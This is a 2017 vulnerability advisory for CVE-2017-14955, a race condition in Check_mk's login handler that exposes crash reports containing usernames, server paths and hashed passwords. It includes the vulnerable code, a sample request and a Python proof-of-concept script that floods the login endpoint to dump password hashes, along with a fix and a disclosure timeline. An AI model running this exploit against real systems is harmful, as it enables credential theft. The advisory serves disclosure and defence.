@@ -1,0 +1,211 @@
+1. ADVISORY INFORMATION
+=======================
+Product:        Check_mk
+Vendor URL:     https://mathias-kettner.de/check_mk.html
+Type:           Race Condition [CWE-362]
+Date found:     2017-09-21
+Date published: 2017-10-18
+CVSSv3 Score:   7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+CVE:            CVE-2017-14955
+
+
+2. CREDITS
+==========
+This vulnerability was discovered and researched by Julien Ahrens from
+RCE Security.
+
+
+3. VERSIONS AFFECTED
+====================
+Check_mk v1.2.8p25
+Check_mk v1.2.8p25 Enterprise
+older versions may be affected too.
+
+
+4. INTRODUCTION
+===============
+Check_MK is comprehensive IT monitoring solution in the tradition of Nagios.
+Check_MK is available as Raw Edition, which is 100% pure open source, and as
+Enterprise Edition with a lot of additional features and professional support.
+
+(from the vendor's homepage)
+
+
+5. VULNERABILITY DETAILS
+========================
+Check_mk is vulnerable to an unauthenticated information disclosure through a
+race condition during the authentication process when trying to authenticate
+with a valid username and an invalid password.
+
+On a failed login, the application calls the function save_users(), which
+performs two os.rename operations on the files "contacts.mk.new" and
+"users.mk.new" (see /packages/check_mk/check_mk-1.2.8p25/web/htdocs/userdb.py):
+
+[..]
+   # Check_MK's monitoring contacts
+   filename = root_dir + "contacts.mk.new"
+   out = create_user_file(filename, "w")
+   out.write("# Written by Multisite UserDB\n# encoding: utf-8\n\n")
+   out.write("contacts.update(\n%s\n)\n" % pprint.pformat(contacts))
+   out.close()
+   os.rename(filename, filename[:-4])
+
+   # Users with passwords for Multisite
+   filename = multisite_dir + "users.mk.new"
+   make_nagios_directory(multisite_dir)
+   out = create_user_file(filename, "w")
+   out.write("# Written by Multisite UserDB\n# encoding: utf-8\n\n")
+   out.write("multisite_users = \\\n%s\n" % pprint.pformat(users))
+   out.close()
+   os.rename(filename, filename[:-4])
+[...]
+
+When sending many concurrent authentication requests with an existing/valid
+username, such as:
+
+POST /check_mk/login.py HTTP/1.1
+Host: localhost
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---9519178121294961341040589727
+Content-Length: 772
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+---9519178121294961341040589727
+Content-Disposition: form-data; name="filled_in"
+
+login
+---9519178121294961341040589727
+Content-Disposition: form-data; name="_login"
+
+1
+---9519178121294961341040589727
+Content-Disposition: form-data; name="_origtarget"
+
+index.py
+---9519178121294961341040589727
+Content-Disposition: form-data; name="_username"
+
+omdadmin
+---9519178121294961341040589727
+Content-Disposition: form-data; name="_password"
+
+welcome
+---9519178121294961341040589727
+Content-Disposition: form-data; name="_login"
+
+Login
+---9519178121294961341040589727--
+
+Then it could happen that one of both os.rename() calls references a non-
+existing file, which has just been renamed by a previous thread. This causes the
+Python script to fail and throw a crash report, which discloses a variety of
+sensitive information, such as internal server paths, account details including
+hashed passwords:
+
+</pre></td></tr><tr class="data odd0"><td class="left">Local Variables</td><td><pre>{'contacts': {u'admin': {'alias': u'Administrator',
+                             'contactgroups': ['all'],
+                             'disable_notifications': False,
+                             'email': u'admin@example.com',
+                             'enforce_pw_change': False,
+                             'last_pw_change': 0,
+                             'last_seen': 0.0,
+                             'locked': False,
+                             'num_failed': 0,
+                             'pager': '',
+                             'password': '$1$400000$13371337asdfasdf',
+                             'roles': ['admin'],
+                             'serial': 2},
+
+A script to automatically exploit this vulnerability can be found on [0].
+
+6. POC
+======
+
+#!/usr/bin/python
+# Exploit Title: Check_mk <=3D v1.2.8p25 save_users() Race Condition
+# Version:       <=3D 1.2.8p25
+# Date:          2017-10-18
+# Author:        Julien Ahrens (@MrTuxracer)
+# Homepage:      https://www.rcesecurity.com
+# Software Link: https://mathias-kettner.de/check_mk.html
+# Tested on:     1.2.8p25
+# CVE:=09=09 CVE-2017-14955
+#
+# Howto / Notes:
+# This scripts exploits the Race Condition in check_mk version 1.2.8p25 and
+# below as described by CVE-2017-14955. You only need a valid username to
+# dump all encrypted passwords and make sure to setup a local proxy to
+# catch the dump. Happy brute forcing ;-)
+
+import requests
+import threading
+
+try:
+=09from requests.packages.urllib3.exceptions import InsecureRequestWarning
+=09requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+except:
+=09pass
+
+# Config Me
+target_url =3D "https://localhost/check_mk/login.py"
+target_username =3D "omdadmin"
+
+proxies =3D {
+  'http': 'http://127.0.0.1:8080',
+  'https': 'http://127.0.0.1:8080',
+}
+
+def make_session():
+=09v =3D requests.post(target_url, verify=3DFalse, proxies=3Dproxies, files=
+=3D{'filled_in': (None, 'login'), '_login': (None, '1'), '_origtarget': (No=
+ne, 'index.py'), '_username': (None, target_username), '_password': (None, =
+'random'), '_login': (None, 'Login')})
+=09return v.content
+
+NUM =3D 50
+
+threads =3D []
+for i in range(NUM):
+    t =3D threading.Thread(target=3Dmake_session)
+    threads.append(t)
+    t.start()
+
+7. RISK
+=======
+To successfully exploit this vulnerability an unauthenticated attacker must only
+have network-level access to the application.
+
+The vulnerability allows remote attackers to trigger an exception, which
+discloses a variety of sensitive internal information such as:
+- Local server paths
+- Usernames
+- Passwords (hashed)
+- and user directory-specific attributes (i.e. LDAP)
+
+
+8. SOLUTION
+===========
+Update to 1.2.8p26.
+
+
+9. REPORT TIMELINE
+==================
+2017-09-21: Discovery of the vulnerability
+2017-09-21: Sent limited information to publicly listed email address
+2017-09-21: Vendor responds and asks for details
+2017-09-21: Full vulnerability details sent to vendor
+2017-09-25: Vendor pushes fix to git
+2017-10-01: MITRE assigns CVE-2017-14955
+2017-10-16: Fix confirmed
+2017-10-18: Public disclosure
+
+
+10. REFERENCES
+=============
+[0] https://www.rcesecurity.com/2017/10/cve-2017-14955-win-a-race-against-check-mk-to-dump-all-your-login-data/
+[1] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14955
+
+
